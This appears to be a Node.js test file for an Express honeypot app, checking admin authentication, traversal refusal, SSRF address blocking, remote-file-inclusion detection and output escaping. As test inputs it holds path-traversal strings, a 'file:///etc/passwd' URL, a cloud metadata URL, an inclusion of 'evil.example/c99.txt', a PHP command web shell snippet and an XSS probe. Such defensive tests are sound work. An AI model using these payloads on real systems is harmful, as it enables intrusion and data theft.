const { test, before, after } = require("node:test");
const assert = require("node:assert");
const fs = require("fs");
const path = require("path");
const { createApp } = require("../express");
const {
  isBlockedAddress,
  parseRemoteUrl,
} = require("../express/security/safeFetch");
const { checkFileInclusion } = require("../express/honey/controller");
const htmlTemplate = require("../express/honey/display/htmlTemplate");
const { listen, tempDir, basic } = require("./helpers");

let server;
let base;
const storageDir = tempDir();
const auth = basic("bee", "correct horse battery staple");

before(async () => {
  const app = createApp({
    storageDir,
    geoip: false,
    beekeeper: { username: "bee", password: "correct horse battery staple" },
  });
  ({ server, base } = await listen(app));
  const filesDir = path.join(storageDir, "files/2000-01-01");
  fs.mkdirSync(filesDir, { recursive: true });
  fs.writeFileSync(
    path.join(filesDir, "abc-shell.txt.bee"),
    "<?php evil(); ?>"
  );
});

after(() => {
  server.close();
  fs.rmSync(storageDir, { recursive: true, force: true });
});

test("beekeeper data routes require auth", async () => {
  for (const url of [
    "/beekeeper",
    "/beekeeper/darts",
    "/beekeeper/js/index.js",
  ]) {
    const res = await fetch(base + url);
    assert.strictEqual(res.status, 401, url);
  }
  const del = await fetch(`${base}/beekeeper/logs/2000-01-01`, {
    method: "DELETE",
  });
  assert.strictEqual(del.status, 401);
});

test("wrong credentials are rejected", async () => {
  const res = await fetch(`${base}/beekeeper/darts`, {
    headers: { authorization: basic("bee", "honey") },
  });
  assert.strictEqual(res.status, 401);
});

test("beekeeper redirects to a trailing slash and serves the dashboard", async () => {
  const res = await fetch(`${base}/beekeeper`, {
    headers: { authorization: auth },
    redirect: "manual",
  });
  assert.strictEqual(res.status, 302);
  assert.strictEqual(res.headers.get("location"), "/beekeeper/");
  const page = await fetch(`${base}/beekeeper/`, {
    headers: { authorization: auth },
  });
  assert.match(await page.text(), /src="js\/index.js"/);
});

test("old public routes are gone", async () => {
  const res = await fetch(`${base}/hive/x?path=..&file=../options.js`);
  const body = await res.text();
  assert.ok(!body.includes("BEEKEEPER_PASSWORD"));
  const del = await fetch(`${base}/beekeeper/d/log/..`);
  assert.strictEqual(del.status, 401);
});

test("payload download works and refuses traversal", async () => {
  const ok = await fetch(
    `${base}/beekeeper/files/2000-01-01/abc-shell.txt.bee`,
    { headers: { authorization: auth } }
  );
  assert.strictEqual(ok.status, 200);
  assert.strictEqual(await ok.text(), "<?php evil(); ?>");

  for (const url of [
    "/beekeeper/files/2000-01-01/..%2F..%2F..%2Fpackage.json",
    "/beekeeper/files/..%2F..%2Fhoney/controller.js",
    "/beekeeper/files/2000-01-01/..%5C..%5Cpackage.json",
  ]) {
    const res = await fetch(base + url, { headers: { authorization: auth } });
    assert.notStrictEqual(res.status, 200, url);
  }
});

test("delete refuses anything that is not a date", async () => {
  const res = await fetch(`${base}/beekeeper/logs/..%2F..%2Fserver.js`, {
    method: "DELETE",
    headers: { authorization: auth },
  });
  assert.strictEqual(res.status, 400);
});

test("sitemap urls are absolute", async () => {
  const res = await fetch(`${base}/sitemap.xml`);
  assert.match(await res.text(), /<loc><!\[CDATA\[http:\/\/127\.0\.0\.1:/);
});

test("private and metadata addresses are blocked", () => {
  for (const ip of [
    "127.0.0.1",
    "10.1.2.3",
    "172.20.0.1",
    "192.168.1.1",
    "169.254.169.254",
    "0.0.0.0",
    "::1",
    "fe80::1",
    "fd00::1",
    "::ffff:127.0.0.1",
  ]) {
    assert.ok(isBlockedAddress(ip), ip);
  }
  for (const ip of ["8.8.8.8", "1.1.1.1", "2606:4700:4700::1111"]) {
    assert.ok(!isBlockedAddress(ip), ip);
  }
  assert.strictEqual(
    parseRemoteUrl("http://169.254.169.254/latest/meta-data"),
    null
  );
  assert.strictEqual(parseRemoteUrl("http://[::1]:3001/"), null);
  assert.strictEqual(parseRemoteUrl("file:///etc/passwd"), null);
  assert.ok(parseRemoteUrl("http://evil.example.com/shell.txt"));
});

test("encoded inclusions are detected", () => {
  assert.strictEqual(
    checkFileInclusion(
      "/index.php?page=http%3A%2F%2Fevil.example%2Fc99.txt%3F"
    ),
    "http://evil.example/c99.txt?"
  );
});

test("fake pages escape the url and the payload", () => {
  const html = htmlTemplate(
    undefined,
    "/x?<script>alert(1)</script>",
    "<?php system($_GET[c]); ?>"
  );
  assert.ok(!html.includes("<script>alert(1)</script>"));
  assert.ok(!html.includes("<?php"));
  assert.ok(html.includes("&lt;?php"));
});
